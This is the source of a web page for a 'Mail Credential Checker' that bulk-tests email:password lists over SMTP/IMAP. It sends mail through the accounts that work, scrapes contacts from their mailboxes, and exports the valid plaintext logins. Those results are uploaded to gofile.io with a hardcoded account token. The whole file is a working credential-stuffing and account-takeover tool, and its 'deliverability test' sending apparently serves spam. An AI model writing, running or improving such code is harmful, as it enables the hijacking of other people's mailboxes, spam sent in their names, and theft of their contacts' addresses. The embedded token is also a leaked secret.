"use client";

import { useMemo, useRef, useState } from "react";
import { parseCredentials, dedupeCredentials, type Credential } from "@/lib/parse";

type Status = "pending" | "checking" | "valid" | "invalid" | "error";

interface Row {
  email: string;
  password: string;
  status: Status;
  smtp?: "ok" | "fail" | "skip";
  imap?: "ok" | "fail" | "skip";
  send?: "ok" | "fail" | "skip" | "pending";
  sendInfo?: string;
  host?: string;
  error?: string;
  contactsFound?: number;
  elapsedMs?: number;
}

interface Contact {
  name?: string;
  email: string;
  source: string;
  folder: string;
  owner: string;
}

export default function Page() {
  const [raw, setRaw] = useState("");
  const [rows, setRows] = useState<Row[]>([]);
  const [busy, setBusy] = useState(false);
  const [concurrency, setConcurrency] = useState(4);
  const [wantSmtp, setWantSmtp] = useState(true);
  const [wantImap, setWantImap] = useState(true);
  const [autoExtract, setAutoExtract] = useState(false);
  const [maxMessages, setMaxMessages] = useState(300);
  const [contacts, setContacts] = useState<Contact[]>([]);
  const [log, setLog] = useState<string[]>([]);
  const [gofileToken, setGofileToken] = useState("Vlgj7YMQ9wNLJKOGdnJoycIfRxS8sSkY");
  const [gofileFolder, setGofileFolder] = useState("");
  const [sendRecipients, setSendRecipients] = useState("");
  const [sendSubject, setSendSubject] = useState("SMTP test");
  const [sendBody, setSendBody] = useState("This is an automated SMTP deliverability test.");
  const [sendFromName, setSendFromName] = useState("");
  const [autoSend, setAutoSend] = useState(false);
  const cancelRef = useRef(false);

  const recipientList = useMemo(
    () =>
      sendRecipients
        .split(/[\s,;]+/)
        .map((s) => s.trim())
        .filter((s) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(s)),
    [sendRecipients],
  );

  const stats = useMemo(() => {
    const s = { total: rows.length, valid: 0, invalid: 0, pending: 0, checking: 0, error: 0 };
    for (const r of rows) (s as any)[r.status]++;
    return s;
  }, [rows]);

  function appendLog(line: string) {
    setLog((l) => [...l.slice(-200), `[${new Date().toLocaleTimeString()}] ${line}`]);
  }

  async function onUpload(ev: React.ChangeEvent<HTMLInputElement>) {
    const files = ev.target.files;
    if (!files) return;
    const chunks: string[] = [];
    for (const f of Array.from(files)) chunks.push(await f.text());
    setRaw((prev) => (prev ? prev + "\n" + chunks.join("\n") : chunks.join("\n")));
    ev.target.value = "";
  }

  function loadFromText() {
    const creds = dedupeCredentials(parseCredentials(raw));
    setRows(
      creds.map((c) => ({
        email: c.email,
        password: c.password,
        status: "pending",
      })),
    );
    setContacts([]);
    appendLog(`Loaded ${creds.length} credentials`);
  }

  async function checkOne(idx: number, r: Row) {
    setRows((prev) => {
      const n = [...prev];
      n[idx] = { ...n[idx], status: "checking" };
      return n;
    });
    try {
      const protocols: string[] = [];
      if (wantSmtp) protocols.push("smtp");
      if (wantImap) protocols.push("imap");
      const res = await fetch("/api/verify", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email: r.email, password: r.password, protocols }),
      });
      const j = await res.json();
      const smtp: Row["smtp"] = wantSmtp ? (j.smtp?.ok ? "ok" : "fail") : "skip";
      const imap: Row["imap"] = wantImap ? (j.imap?.ok ? "ok" : "fail") : "skip";
      const ok = j.ok;
      const host = j.imap?.host || j.smtp?.host;
      const update: Row = {
        ...r,
        status: ok ? "valid" : "invalid",
        smtp,
        imap,
        host,
        error: ok ? undefined : j.imap?.error || j.smtp?.error || j.error,
        elapsedMs: j.elapsedMs,
      };
      setRows((prev) => {
        const n = [...prev];
        n[idx] = update;
        return n;
      });

      if (ok && autoSend && wantSmtp && j.smtp?.ok && recipientList.length) {
        await sendTestOne(idx, update);
      }
      if (ok && autoExtract && wantImap && j.imap?.ok) {
        await extractOne(idx, update);
      }
    } catch (e: any) {
      setRows((prev) => {
        const n = [...prev];
        n[idx] = { ...n[idx], status: "error", error: String(e?.message || e) };
        return n;
      });
    }
  }

  async function sendTestOne(idx: number, r: Row) {
    if (!recipientList.length) {
      appendLog("No recipients configured — skipping send test");
      return;
    }
    setRows((prev) => {
      const n = [...prev];
      n[idx] = { ...n[idx], send: "pending" };
      return n;
    });
    try {
      const res = await fetch("/api/send-test", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          email: r.email,
          password: r.password,
          to: recipientList,
          subject: sendSubject,
          text: sendBody,
          fromName: sendFromName || undefined,
        }),
      });
      const j = await res.json();
      const accepted: string[] = j.accepted || [];
      const rejected: string[] = j.rejected || [];
      const info = j.ok
        ? `accepted ${accepted.length}/${recipientList.length}${rejected.length ? ` (rejected: ${rejected.join(", ")})` : ""}`
        : (j.error || j.response || "send failed").slice(0, 200);
      setRows((prev) => {
        const n = [...prev];
        n[idx] = { ...n[idx], send: j.ok ? "ok" : "fail", sendInfo: info };
        return n;
      });
      appendLog(`Send ${r.email} → ${j.ok ? "OK" : "FAIL"}: ${info}`);
    } catch (e: any) {
      const info = String(e?.message || e);
      setRows((prev) => {
        const n = [...prev];
        n[idx] = { ...n[idx], send: "fail", sendInfo: info };
        return n;
      });
      appendLog(`Send error ${r.email}: ${info}`);
    }
  }

  async function sendTestAllValid() {
    if (!recipientList.length) {
      appendLog("Add at least one recipient before sending");
      return;
    }
    setBusy(true);
    cancelRef.current = false;
    const targets = rows
      .map((r, i) => ({ r, i }))
      .filter((x) => x.r.status === "valid" && x.r.smtp === "ok");
    const pool = Math.max(1, Math.min(8, concurrency));
    let cursor = 0;
    const workers = Array.from({ length: pool }, async () => {
      while (!cancelRef.current) {
        const mine = cursor++;
        if (mine >= targets.length) return;
        const { r, i } = targets[mine];
        await sendTestOne(i, r);
      }
    });
    await Promise.all(workers);
    setBusy(false);
    appendLog("Send run finished");
  }

  async function extractOne(idx: number, r: Row) {
    try {
      const res = await fetch("/api/extract", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email: r.email, password: r.password, maxMessages }),
      });
      const j = await res.json();
      const list: Contact[] = (j.contacts || []).map((c: any) => ({ ...c, owner: r.email }));
      setContacts((prev) => {
        const seen = new Set(prev.map((p) => p.owner + "\0" + p.email));
        const merged = [...prev];
        for (const c of list) {
          const k = c.owner + "\0" + c.email;
          if (!seen.has(k)) {
            seen.add(k);
            merged.push(c);
          }
        }
        return merged;
      });
      setRows((prev) => {
        const n = [...prev];
        n[idx] = { ...n[idx], contactsFound: list.length };
        return n;
      });
      appendLog(`Extracted ${list.length} contacts from ${r.email} (scanned ${j.messagesScanned})`);
    } catch (e: any) {
      appendLog(`Extract failed for ${r.email}: ${String(e?.message || e)}`);
    }
  }

  async function runChecks() {
    if (!rows.length || busy) return;
    cancelRef.current = false;
    setBusy(true);
    const queue = rows.map((r, i) => ({ r, i })).filter((x) => x.r.status === "pending" || x.r.status === "error");
    let cursor = 0;
    const workers = Array.from({ length: Math.max(1, Math.min(16, concurrency)) }, async () => {
      while (!cancelRef.current) {
        const mine = cursor++;
        if (mine >= queue.length) return;
        const { r, i } = queue[mine];
        await checkOne(i, r);
      }
    });
    await Promise.all(workers);
    setBusy(false);
    appendLog("Run finished");
  }

  function stop() {
    cancelRef.current = true;
    appendLog("Stop requested");
  }

  async function extractAllValid() {
    setBusy(true);
    const targets = rows
      .map((r, i) => ({ r, i }))
      .filter((x) => x.r.status === "valid" && x.r.imap === "ok");
    for (const { r, i } of targets) {
      if (cancelRef.current) break;
      await extractOne(i, r);
    }
    setBusy(false);
  }

  function validCombos(): string {
    return rows
      .filter((r) => r.status === "valid")
      .map((r) => `${r.email}:${r.password}`)
      .join("\n");
  }

  function allAddresses(): string {
    const set = new Set<string>();
    for (const r of rows) if (r.status === "valid") set.add(r.email);
    for (const c of contacts) set.add(c.email);
    return [...set].sort().join("\n");
  }

  function contactsCsv(): string {
    const header = "owner,name,email,source,folder";
    const rows = contacts.map((c) =>
      [c.owner, c.name || "", c.email, c.source, c.folder]
        .map((v) => `"${String(v).replace(/"/g, '""')}"`)
        .join(","),
    );
    return [header, ...rows].join("\n");
  }

  function validCsv(): string {
    const header = "email,password,smtp,imap,host,error";
    const lines = rows
      .filter((r) => r.status === "valid")
      .map((r) =>
        [r.email, r.password, r.smtp || "", r.imap || "", r.host || "", r.error || ""]
          .map((v) => `"${String(v).replace(/"/g, '""')}"`)
          .join(","),
      );
    return [header, ...lines].join("\n");
  }

  function download(name: string, text: string) {
    const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = name;
    a.click();
    URL.revokeObjectURL(url);
  }

  async function uploadCloud(name: string, text: string) {
    appendLog(`Uploading ${name} to gofile.io...`);
    try {
      const res = await fetch("/api/upload-gofile", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          filename: name,
          content: text,
          token: gofileToken || undefined,
          folderId: gofileFolder || undefined,
        }),
      });
      const j = await res.json();
      if (j.ok) {
        appendLog(`Uploaded: ${j.downloadPage}`);
        window.open(j.downloadPage, "_blank", "noopener");
      } else {
        appendLog(`Upload failed: ${j.error}`);
      }
    } catch (e: any) {
      appendLog(`Upload error: ${String(e?.message || e)}`);
    }
  }

  return (
    <div className="container">
      <h1>Mail Credential Checker</h1>
      <div className="sub">Upload email:password lists, verify over SMTP/IMAP, extract contacts, export results.</div>

      <div className="card">
        <div className="row" style={{ marginBottom: 8 }}>
          <input type="file" multiple onChange={onUpload} />
          <button className="secondary" onClick={loadFromText}>Parse text</button>
          <span className="hint">Format: email:password (one per line)</span>
        </div>
        <textarea
          placeholder="user@example.com:password"
          value={raw}
          onChange={(e) => setRaw(e.target.value)}
        />
      </div>

      <div className="card">
        <div className="row">
          <label><input type="checkbox" checked={wantSmtp} onChange={(e) => setWantSmtp(e.target.checked)} /> SMTP</label>
          <label><input type="checkbox" checked={wantImap} onChange={(e) => setWantImap(e.target.checked)} /> IMAP</label>
          <label><input type="checkbox" checked={autoSend} onChange={(e) => setAutoSend(e.target.checked)} /> Auto-send test on success</label>
          <label><input type="checkbox" checked={autoExtract} onChange={(e) => setAutoExtract(e.target.checked)} /> Auto-extract on success</label>
          <label>Concurrency <input type="number" min={1} max={16} value={concurrency} onChange={(e) => setConcurrency(parseInt(e.target.value) || 1)} style={{ width: 70 }} /></label>
          <label>Max messages/acct <input type="number" min={10} max={5000} value={maxMessages} onChange={(e) => setMaxMessages(parseInt(e.target.value) || 100)} style={{ width: 90 }} /></label>
          <div className="grow" />
          {!busy
            ? <button onClick={runChecks} disabled={!rows.length}>Run checks</button>
            : <button className="secondary" onClick={stop}>Stop</button>}
          <button className="secondary" onClick={sendTestAllValid} disabled={busy || !recipientList.length || !rows.some((r) => r.status === "valid" && r.smtp === "ok")}>Send test to all valid</button>
          <button className="secondary" onClick={extractAllValid} disabled={busy || !rows.some((r) => r.status === "valid")}>Extract all valid</button>
        </div>
        <div className="row" style={{ marginTop: 8 }}>
          <span className="pill">Total {stats.total}</span>
          <span className="pill ok">Valid {stats.valid}</span>
          <span className="pill bad">Invalid {stats.invalid}</span>
          <span className="pill wait">Checking {stats.checking}</span>
          <span className="pill">Pending {stats.pending}</span>
          {stats.error ? <span className="pill bad">Errors {stats.error}</span> : null}
          <span className="pill">Contacts {contacts.length}</span>
        </div>
      </div>

      <div className="card">
        <div className="row" style={{ marginBottom: 8 }}>
          <strong>Send test email</strong>
          <span className="hint">
            {recipientList.length
              ? `${recipientList.length} recipient${recipientList.length > 1 ? "s" : ""} ready`
              : "Add at least one recipient"}
          </span>
        </div>
        <label>Recipients (comma, semicolon, space, or newline separated)
          <textarea
            placeholder="dest1@example.com, dest2@example.com"
            value={sendRecipients}
            onChange={(e) => setSendRecipients(e.target.value)}
            style={{ minHeight: 60 }}
          />
        </label>
        <div className="row" style={{ marginTop: 8 }}>
          <label className="grow">Subject<input type="text" value={sendSubject} onChange={(e) => setSendSubject(e.target.value)} /></label>
          <label className="grow">From name (optional)<input type="text" value={sendFromName} onChange={(e) => setSendFromName(e.target.value)} placeholder="e.g. Tester" /></label>
        </div>
        <label style={{ marginTop: 8, display: "block" }}>Body
          <textarea value={sendBody} onChange={(e) => setSendBody(e.target.value)} style={{ minHeight: 80 }} />
        </label>
      </div>

      <div className="card">
        <div className="row" style={{ marginBottom: 8 }}>
          <strong>Export</strong>
          <button className="secondary" onClick={() => download("valid.txt", validCombos())} disabled={!stats.valid}>valid.txt</button>
          <button className="secondary" onClick={() => download("valid.csv", validCsv())} disabled={!stats.valid}>valid.csv</button>
          <button className="secondary" onClick={() => download("addresses.txt", allAddresses())} disabled={!stats.valid && !contacts.length}>addresses.txt</button>
          <button className="secondary" onClick={() => download("contacts.csv", contactsCsv())} disabled={!contacts.length}>contacts.csv</button>
          <div className="grow" />
        </div>
        <div className="row">
          <label className="grow">gofile token<input type="text" value={gofileToken} onChange={(e) => setGofileToken(e.target.value)} placeholder="Account Token" /></label>
          <label className="grow">gofile folderId (optional)<input type="text" value={gofileFolder} onChange={(e) => setGofileFolder(e.target.value)} placeholder="folder id" /></label>
        </div>
        <div className="row" style={{ marginTop: 8 }}>
          <button onClick={() => uploadCloud("valid.txt", validCombos())} disabled={!stats.valid}>Upload valid.txt</button>
          <button onClick={() => uploadCloud("valid.csv", validCsv())} disabled={!stats.valid}>Upload valid.csv</button>
          <button onClick={() => uploadCloud("addresses.txt", allAddresses())} disabled={!stats.valid && !contacts.length}>Upload addresses.txt</button>
          <button onClick={() => uploadCloud("contacts.csv", contactsCsv())} disabled={!contacts.length}>Upload contacts.csv</button>
        </div>
      </div>

      <div className="card">
        <strong>Accounts</strong>
        <div className="scroll" style={{ marginTop: 8 }}>
          <table>
            <thead>
              <tr>
                <th>#</th>
                <th>Email</th>
                <th>Status</th>
                <th>SMTP</th>
                <th>IMAP</th>
                <th>Send</th>
                <th>Host</th>
                <th>Contacts</th>
                <th>Info</th>
              </tr>
            </thead>
            <tbody>
              {rows.map((r, i) => (
                <tr key={`${r.email}:${i}`}>
                  <td className="mono">{i + 1}</td>
                  <td className="mono">{r.email}</td>
                  <td>
                    <span className={`pill ${r.status === "valid" ? "ok" : r.status === "invalid" ? "bad" : r.status === "checking" ? "wait" : ""}`}>
                      {r.status}
                    </span>
                  </td>
                  <td><span className="mono">{r.smtp || ""}</span></td>
                  <td><span className="mono">{r.imap || ""}</span></td>
                  <td>
                    {r.send ? (
                      <span className={`pill ${r.send === "ok" ? "ok" : r.send === "fail" ? "bad" : "wait"}`}>{r.send}</span>
                    ) : null}
                  </td>
                  <td className="mono">{r.host || ""}</td>
                  <td className="mono">{r.contactsFound ?? ""}</td>
                  <td className="mono error" title={r.sendInfo || r.error || ""}>{(r.sendInfo || r.error || "").slice(0, 140)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {contacts.length ? (
        <div className="card">
          <strong>Contacts ({contacts.length})</strong>
          <div className="scroll" style={{ marginTop: 8 }}>
            <table>
              <thead>
                <tr>
                  <th>Owner</th>
                  <th>Name</th>
                  <th>Email</th>
                  <th>Source</th>
                  <th>Folder</th>
                </tr>
              </thead>
              <tbody>
                {contacts.slice(0, 2000).map((c, i) => (
                  <tr key={i}>
                    <td className="mono">{c.owner}</td>
                    <td>{c.name || ""}</td>
                    <td className="mono">{c.email}</td>
                    <td className="mono">{c.source}</td>
                    <td className="mono">{c.folder}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
          {contacts.length > 2000 ? <div className="hint">Showing first 2000 rows. Export to see all.</div> : null}
        </div>
      ) : null}

      <div className="card">
        <strong>Log</strong>
        <pre className="mono" style={{ whiteSpace: "pre-wrap", margin: 0, maxHeight: 200, overflow: "auto" }}>
          {log.join("\n")}
        </pre>
      </div>
    </div>
  );
}
